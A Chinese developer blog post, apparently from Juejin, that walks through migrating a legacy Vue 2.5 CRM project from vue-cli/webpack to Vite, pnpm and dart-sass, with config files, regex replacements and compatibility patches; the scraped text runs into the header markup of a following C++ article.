.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>🎯  实在是太慢了,影响开发效率,</p>
<p>📄  既然做了那就彻底点,原来的yarn 也换为了 pnpm , node-sass 换为了 dart-sass, vue-cli 换为 vite 7+</p>
<p>首先要做好思想准备,你的耐心是有限的,但是面对你的是无穷无尽的报错和各种奇怪的原因跑不起来的深渊,不过我觉得报错才是我们的朋友,因为白屏才是最可怕的,什么信息也没有,要自己去找</p>
<p>下面就开始了,我们想一想,如果升级打包工具的话,哪些写法要变呢,聪明的你应该已经想到了,原来依赖vue-cli(webpack)环境的部分肯定是用不了了的,所以我们要找到这些替代方案,比如垫片和适配器和改为新的api方法.还有就是原来解析.vue文件的loader没了,现在要换人了那就是 vite-plugin-vue2 ,还有其他的插件和loader,根据你的项目而定,都需要被替换.</p>
<p>大部分插件都可以在这里面找到
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvitejs%2Fawesome-vite%3Ftab%3Dreadme-ov-file%23plugins" target="_blank" title="https://github.com/vitejs/awesome-vite?tab=readme-ov-file#plugins" ref="nofollow noopener noreferrer">vite插件列表</a></p>
<h6 data-id="heading-0">1 更换环境</h6>
<p>首先vite和 vite-plugin-vue2 装上,有两个版本,2.7以上和非2.7以上版本,我这边项目很老,而且还有些原来外包魔改后的库依赖2.5,我就不升级了,老实用vue2.5x的版本</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Funderfin%2Fvite-plugin-vue2" target="_blank" title="https://github.com/underfin/vite-plugin-vue2" ref="nofollow noopener noreferrer">Vue2 plugin for Vite</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvitejs%2Fvite-plugin-vue2" target="_blank" title="https://github.com/vitejs/vite-plugin-vue2" ref="nofollow noopener noreferrer">Vite plugin for Vue 2.7</a></p>
<p>之后就是需要告诉vite如何打包我们的项目,我们只需要写vite.config.js就好了</p>
<ul>
<li>其中 ClosePlugin 是解决因为打包的时候会挂在built in 那个地方不正确退出</li>
<li>vueDevTools 在vue2中用不了,看了下issue,只能用浏览器插件了,所以只能 codeInspectorPlugin 将就下了</li>
<li>css预处理器,一般情况下都不需要配置,只需要安装sass等依赖就好了,但是我这边不一样,原来外包的人用了很多的骚操作</li>
<li>至于babel和core-js,我直接移除,都这么多年了你还用不支持这些语法的浏览器是不是该升级一下了😊😊😊</li>
<li>其他的配置视情况而定,在插件列表中找到对应的插件就好</li>
</ul>
<p>下面是我的配置,给大家用来参考</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig, loadEnv } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { createVuePlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-vue2'</span>
<span class="hljs-keyword">import</span> { codeInspectorPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'code-inspector-plugin'</span>
<span class="hljs-keyword">import</span> { resolve } <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ClosePlugin</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite-plugin-close.js'</span>

<span class="hljs-comment">// 使用 defineConfig 定义 Vite 配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode, command }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">loadEnv</span>(mode, process.<span class="hljs-title function_">cwd</span>())
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env)

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">base</span>: <span class="hljs-string">'./'</span>,
    <span class="hljs-attr">server</span>: {
      <span class="hljs-attr">port</span>: <span class="hljs-number">8090</span>,
      <span class="hljs-attr">host</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">proxy</span>: {
        <span class="hljs-string">'/api-test'</span>: {
          <span class="hljs-attr">target</span>: <span class="hljs-string">'http://172.20.203.30:18000'</span>,
          <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">rewrite</span>: <span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> s = p.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'/api-test'</span>, <span class="hljs-string">''</span>)
            <span class="hljs-comment">// console.log(`proxy to test =&gt;  ${p}`);</span>
            <span class="hljs-keyword">return</span> s
          }
        }
      }
    },

    <span class="hljs-comment">// 配置插件</span>
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-title class_">ClosePlugin</span>(),
      <span class="hljs-title function_">codeInspectorPlugin</span>({
        <span class="hljs-attr">bundler</span>: <span class="hljs-string">'vite'</span>
      }),

      <span class="hljs-comment">//  oops vue2 不支持 😭😭😭</span>
      <span class="hljs-comment">// vueDevTools({</span>
      <span class="hljs-comment">//   launchEditor: env.VITE_LAUNCH_EDITOR ?? 'code'</span>
      <span class="hljs-comment">// }),</span>
    ],
    <span class="hljs-attr">css</span>: {
      <span class="hljs-attr">preprocessorOptions</span>: {
        <span class="hljs-attr">scss</span>: {
          <span class="hljs-attr">additionalData</span>: <span class="hljs-function">(<span class="hljs-params">content, filename</span>) =&gt;</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">getAdditionalData</span>(filename) + content
          },
          <span class="hljs-comment">// 或者指定禁用特定警告</span>
          <span class="hljs-attr">silenceDeprecations</span>: [
            <span class="hljs-string">'legacy-js-api'</span>,      <span class="hljs-comment">// 旧版 JS API</span>
            <span class="hljs-string">'global'</span>,             <span class="hljs-comment">// 全局变量</span>
            <span class="hljs-string">'import'</span>,             <span class="hljs-comment">// @import 语法</span>
            <span class="hljs-string">'color'</span>,              <span class="hljs-comment">// 旧的颜色函数</span>
            <span class="hljs-string">'division'</span>,           <span class="hljs-comment">// 除法运算</span>
            <span class="hljs-string">'mixin'</span>,              <span class="hljs-comment">// 混合器警告</span>
            <span class="hljs-string">'selector'</span>           <span class="hljs-comment">// 选择器警告</span>
          ]
        }
      }
    },

    <span class="hljs-comment">// 配置模块解析规则</span>
    <span class="hljs-attr">resolve</span>: {
      <span class="hljs-comment">// 配置路径别名</span>
      <span class="hljs-attr">alias</span>: {
        <span class="hljs-string">'@'</span>: <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'src'</span>),
        <span class="hljs-string">'element-ui-theme'</span>: <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'node_modules/element-ui/packages/theme-chalk/src'</span>)
      },
      <span class="hljs-comment">// https://cn.vitejs.dev/config/#resolve-extensions</span>
      <span class="hljs-attr">extensions</span>: [<span class="hljs-string">'.mjs'</span>, <span class="hljs-string">'.js'</span>, <span class="hljs-string">'.ts'</span>, <span class="hljs-string">'.jsx'</span>, <span class="hljs-string">'.tsx'</span>, <span class="hljs-string">'.json'</span>, <span class="hljs-string">'.vue'</span>]
    }
  }
})

<span class="hljs-keyword">function</span> <span class="hljs-title function_">getAdditionalData</span>(<span class="hljs-params">filePath</span>) {
  <span class="hljs-comment">// 根据文件路径决定是否注入</span>
  <span class="hljs-keyword">if</span> (filePath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'xr-theme.scss'</span>)) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span> <span class="hljs-comment">// 不向 xr-theme.scss 中的文件注入</span>
  }

  <span class="hljs-keyword">return</span> <span class="hljs-string">`
    @import "@/styles/xr-theme.scss";
    @import "element-ui/packages/theme-chalk/src/common/var.scss";
  `</span>
}
</code></pre>
<h6 data-id="heading-1">css 相关</h6>
<ul>
<li>
<p>首先如果你换了dart-sass 的话,会有很多的报错
比如 <code>/deep/</code>   需要用 <code>::v-deep</code> 来替换</p>
</li>
<li>
<p>原来scss中还用了这种特殊的语法,在js中使用css变量</p>
</li>
</ul>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// the :export directive is the magic sauce for webpack</span>
<span class="hljs-comment">// https://www.bluematador.com/blog/how-to-share-variables-between-js-and-sass</span>
:<span class="hljs-selector-tag">export</span> {
  colorPrimary: $<span class="hljs-attr">--color-primary</span>; <span class="hljs-comment">//0052CC</span>
  colorBlack: $<span class="hljs-attr">--color-black</span>; <span class="hljs-comment">//  172B4D</span>
  colorSuccess: $<span class="hljs-attr">--color-success</span>; <span class="hljs-comment">//  36B37E</span>
  colorWarning: $<span class="hljs-attr">--color-warning</span>; <span class="hljs-comment">//  FFAB00</span>
  colorDanger: $<span class="hljs-attr">--color-danger</span>; <span class="hljs-comment">//  FF5630</span>
  colorN40: $<span class="hljs-attr">--color-n40</span>; <span class="hljs-comment">//  DFE1E6</span>
}
</code></pre>
<p>在vite中暂时没有找到很好的支持,所以建立了一个js文件用于存放这些变量</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">export</span> <span class="hljs-type">const</span> XRTheme = {
  colorPrimary: <span class="hljs-string">'#0052CC'</span>,
  colorBlack: <span class="hljs-string">'#172B4D'</span>,
  colorSuccess: <span class="hljs-string">'#36B37E'</span>,
  colorWarning: <span class="hljs-string">'#FFAB00'</span>,
  colorDanger: <span class="hljs-string">'#FF5630'</span>,
  colorN40: <span class="hljs-string">'#DFE1E6'</span>,

  <span class="hljs-comment">//   ......</span>
}

</code></pre>
<p>之后用regex全局替换,要把全部的<code>import xrTheme from '@/styles/xr-theme.scss'</code> 这种替换为 <code>import { XRTheme as xrTheme } from '@/common/cssTheme.js'</code>.</p>
<p>大概就是这个意思</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-string">"import xrTheme from '@/styles/xr-theme.scss'"</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/import +(xrTheme) +from +'@\/styles\/xr-theme.scss'/</span>,<span class="hljs-string">"import { XRTheme as $1} from '@/common/cssTheme.js'"</span>)
</code></pre>
<p>原来人还有一个骚操作,全局注入导入</p>
<p>在vue-cli中的配置如下</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> oneOfsMap = config.<span class="hljs-keyword">module</span>.<span class="hljs-built_in">rule</span>(<span class="hljs-string">'scss'</span>).oneOfs.store
oneOfsMap.forEach((item) =&gt; {
  item
    .<span class="hljs-built_in">use</span>(<span class="hljs-string">'sass-resources-loader'</span>)
    .<span class="hljs-built_in">loader</span>(<span class="hljs-string">'sass-resources-loader'</span>)
    .<span class="hljs-built_in">options</span>({
      resources: [
        <span class="hljs-built_in">resolve</span>(<span class="hljs-string">'src/styles/xr-theme.scss'</span>),
        <span class="hljs-built_in">resolve</span>(
          <span class="hljs-string">'node_modules/element-ui/packages/theme-chalk/src/common/var.scss'</span>
        )
      ]
    })
    .<span class="hljs-built_in">end</span>()
})
</code></pre>
<p>vite中scss有支持,我写为函数形式是因为他们要注入 @import "@/styles/xr-theme.scss"; 但是向 xr-theme.scss 文件注入会无限递归,所以需要限制,但是不知道为什么vue-cli中能自动解决这个问题😒</p>
<pre><code class="hljs language-kotlin" lang="kotlin">css: {
  preprocessorOptions: {
    scss: {
      additionalData: (content, filename) =&gt; {
        <span class="hljs-keyword">return</span> getAdditionalData(filename) + content
      },
    }
  }
}


function getAdditionalData(filePath) {
  <span class="hljs-comment">// 根据文件路径决定是否注入</span>
  <span class="hljs-keyword">if</span> (filePath.includes(<span class="hljs-string">'xr-theme.scss'</span>)) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span> <span class="hljs-comment">// 不向 xr-theme.scss 中的文件注入</span>
  }

  <span class="hljs-keyword">return</span> `
    <span class="hljs-meta">@import</span> <span class="hljs-string">"@/styles/xr-theme.scss"</span>;
    <span class="hljs-meta">@import</span> <span class="hljs-string">"element-ui/packages/theme-chalk/src/common/var.scss"</span>;
  `
}
</code></pre>
<p>当然还会有些警告,比如scss某些语法已经过时了,但是感觉暂时也没有很好的方法来换他们,因为感觉不是一行regex能搞定的,最好有语法分析,至于官方的迁移工具是不支持.vue文件的.所以暂时没时间搞了</p>
<p>这一通操作下来改了180+个文件</p>
<h6 data-id="heading-2">js和环境相关</h6>
<p>原来导入了一些函数,但是不存在,cli中不会报错,但是vite中会找不到,需要对这些前人留下的坑全部给填掉</p>
<p><code>process.env.VUE_APP_CONTACT_URL</code> 这种变量需要被替换为 <code>import.meta.env.VITE_CONTACT_URL</code>
记得VUE开头要换位VITE开头,不然找不到</p>
<p><code>process.env.VUE_APP_([^ ]+)</code> 替换为 <code>import.meta.env.VITE_($1)</code></p>
<p>require api替换 <code>require('@/assets/callCenter/ring.png')</code>  替换为
<code>new URL('@/assets/img/head.png', import.meta.url).href</code></p>
<p>regex 如下
<code>"require('@/assets/callCenter/ring.png')".replace(/require\('([^']+)'\)/,"new URL('$1', import.meta.url).href")</code></p>
<p>其中store 和 router 使用了动态导入,但是require.context是webpack的语法,看vite官方文档,有一个api比较像,注意eager要为true,不然返回的是一个Map&lt;string,Promise&lt;Module&gt;&gt;的类型</p>
<p><code>importAll(require.context('./modules', false, /.js$/))</code> 替换为 <code>importAll(import.meta.glob('./modules/*.js', { eager: true }))</code></p>
<p><code>importAll</code>中是<code>modules.keys().forEach()</code>写法,需要替换为<code>Object.keys(modules)</code>,而且key可能和原来预想的不同,我就是因为这个原因直接白屏了,因为后面模块名不对导致加载逻辑全错,下面贴出代码对比</p>
<pre><code class="hljs language-javascript" lang="javascript"> <span class="hljs-keyword">const</span> syncRouters = []
 <span class="hljs-keyword">const</span> asyncRouterMap = []
 
-<span class="hljs-keyword">function</span> <span class="hljs-title function_">importAll</span>(<span class="hljs-params">r</span>) {
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">importAll</span>(<span class="hljs-params">modules</span>) {
   <span class="hljs-keyword">let</span> manageIndex = -<span class="hljs-number">1</span>
-  r.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
-    <span class="hljs-keyword">const</span> fileName = key.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>, -<span class="hljs-number">3</span>)
-    <span class="hljs-keyword">const</span> itemRouter = <span class="hljs-title function_">r</span>(key).<span class="hljs-property">default</span>
+
+  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(modules).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">moduleKey</span> =&gt;</span> {
+    <span class="hljs-keyword">const</span> fileName = moduleKey.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>, -<span class="hljs-number">3</span>)
+    <span class="hljs-keyword">const</span> itemRouter = modules[moduleKey].<span class="hljs-property">default</span>
+    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fileName,moduleKey,itemRouter)
+
     <span class="hljs-keyword">if</span> (fileName.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'sync'</span>)) {
       syncRouters.<span class="hljs-title function_">push</span>(...itemRouter)
     } <span class="hljs-keyword">else</span> {
       asyncRouterMap.<span class="hljs-title function_">unshift</span>(asyncRouterMap.<span class="hljs-title function_">splice</span>(oaIndex, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>])
     }
   }
 }
 
-importAll(<span class="hljs-built_in">require</span>.<span class="hljs-title function_">context</span>(<span class="hljs-string">'./modules'</span>, <span class="hljs-literal">false</span>, <span class="hljs-regexp">/\.js$/</span>))
+importAll(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-title function_">glob</span>(<span class="hljs-string">'./modules/*.js'</span>, { <span class="hljs-attr">eager</span>: <span class="hljs-literal">true</span> }))
 
 <span class="hljs-keyword">export</span> {
   syncRouters,
</code></pre>
<p>原来还在vue代码中用过path.resolve 这种nodejs中的api,直接写一个垫片resolve之后导入,全局替换导入模块,当然你也可以写vite插件替换或者模拟虚拟模块解析之后映射,至于实现我是找ai写的就不贴了</p>
<pre><code class="hljs language-javascript" lang="javascript"> <span class="hljs-keyword">import</span> { mapGetters } <span class="hljs-keyword">from</span> <span class="hljs-string">'vuex'</span>
 <span class="hljs-keyword">import</span> { getNavMenus } <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/utils'</span>
-<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>
+<span class="hljs-keyword">import</span> { path } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/common/path'</span>
 
 <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
   <span class="hljs-attr">name</span>: <span class="hljs-string">'CrmLayout'</span>,
           auth = <span class="hljs-variable language_">this</span>.$auth(item.<span class="hljs-property">permissions</span>.<span class="hljs-title function_">join</span>(<span class="hljs-string">'.'</span>))
         }
         <span class="hljs-keyword">if</span> (!item.<span class="hljs-property">hidden</span> &amp;&amp; auth) {
           sideMenus.<span class="hljs-title function_">push</span>({
             ...item,
             <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(mainPath, item.<span class="hljs-property">path</span>)

</code></pre>
<p>这一波又是60+个文件的修改</p>
<h6 data-id="heading-3">第三方依赖兼容</h6>
<p>外包使用的vue2-org-tree 的库中找不到某个文件,其实是路径解析的问题,我们需要明确后缀,注意:vite会查看pkg.json,优先使用module</p>
<p>这个操作需要改源码,直接用pnpm patch功能就好,非常方便</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//   pkg.json</span>
{
    <span class="hljs-string">"main"</span>: <span class="hljs-string">"dist/index.js"</span>,
    <span class="hljs-string">"module"</span>: <span class="hljs-string">"src/main.js"</span>,
}

<span class="hljs-comment">//   index.js</span>
- <span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue2OrgTree</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/org-tree'</span>
+ <span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue2OrgTree</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/org-tree.vue'</span>
</code></pre>
<p>项目中外包使用了自己魔改的el-ui库,并且基于魔改库重写了插件,比如 el-bigdata-table 中的 render.js 用到了jsx语法,感觉没必要为了一个依赖引入jsx,所以建了一个子工程,写一套打包配置来打包为h函数版本,最后拷贝到项目,聪明的你可能要问为什么要自己写打包配置,因为他的包中只有源码,没有上传打包配置😂,下面是jsx版本</p>
<pre><code class="hljs language-kotlin" lang="kotlin">export default function render(h, oldRender) {
  <span class="hljs-keyword">return</span> (
    &lt;div
      style={[{height: `${<span class="hljs-keyword">this</span>.table.virtualBodyHeight}px`}]}
      <span class="hljs-keyword">class</span>={[<span class="hljs-string">'el-table__virtual-wrapper'</span>, {<span class="hljs-string">'el-table--fixed__virtual-wrapper'</span>: <span class="hljs-keyword">this</span>.fixed}]}
      v-mousewheel={<span class="hljs-keyword">this</span>.table.handleFixedMousewheel}
    &gt;
      &lt;div style={[{transform: `translateY(${<span class="hljs-keyword">this</span>.table.innerTop}px)`}]}&gt;
      {
        oldRender.call(<span class="hljs-keyword">this</span>, h)
      }
      &lt;/div&gt;
    &lt;/div&gt;
  );
}
</code></pre>
<h5 data-id="heading-4">打包部分</h5>
<p>打包还有点小插曲,就是卡built in xxx.xxxs这里,看国外stack overflow中和一些文章中说要写个插件,其实就是在结束的钩子中调用  process.exit(0) 系统调用</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ClosePlugin</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'ClosePlugin'</span>, <span class="hljs-comment">// required, will show up in warnings and errors</span>

    <span class="hljs-comment">// use this to catch errors when building</span>
    <span class="hljs-title function_">buildEnd</span>(<span class="hljs-params">error</span>) {
      <span class="hljs-keyword">if</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Error bundling'</span>)
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error)
        process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Build ended'</span>)
      }
    },

    <span class="hljs-comment">// use this to catch the end of a build without errors</span>
    <span class="hljs-title function_">closeBundle</span>(<span class="hljs-params">id</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Bundle closed'</span>)
      process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)
    }
  }
}
</code></pre>
<p>模板文件修改,主要是加入 <code>&lt;script type="module" src="/src/main.js"&gt;&lt;/script&gt;</code>,这样vite才知道入口</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"IE=edge,chrome=1"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"favicon.ico"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CRM<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/src/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>记得发布的vite的base参数也要调整,nginx也是</p>
<p>可能还有遗漏,但是大概就是这些了,感谢观看😊😊😊!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[c++中的内存管理：栈，堆及RALL机制]]></title>    <link>https://juejin.cn/post/7589930672833183779</link>    <guid>https://juejin.cn/post/7589930672833183779</guid>    <pubDate>2026-01-01T08:00:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589930672833183779" data-draft-id="7589830701614858240" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="c++中的内存管理：栈，堆及RALL机制"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2026-01-01T08:00:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wjlnew"/> <meta itemprop="url" content="https://juejin.cn/user/3097802264557401"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            c++中的内存管理：栈，堆及RALL机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097802264557401/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wjlnew
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:00:32.000Z" title="Thu Jan 01 2026 08:00:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 